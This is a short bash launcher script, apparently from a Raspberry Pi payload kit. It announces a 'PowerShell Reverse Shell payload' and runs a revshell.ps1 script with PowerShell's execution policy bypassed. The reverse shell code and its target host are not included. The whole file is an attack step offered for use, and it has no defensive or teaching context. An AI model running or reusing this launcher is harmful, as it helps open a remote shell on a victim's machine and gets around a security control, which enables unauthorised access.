#!/bin/bash
echo "[*] Running PowerShell Reverse Shell payload"
powershell -ExecutionPolicy Bypass -File /home/pi/payloads/revshell/revshell.ps1
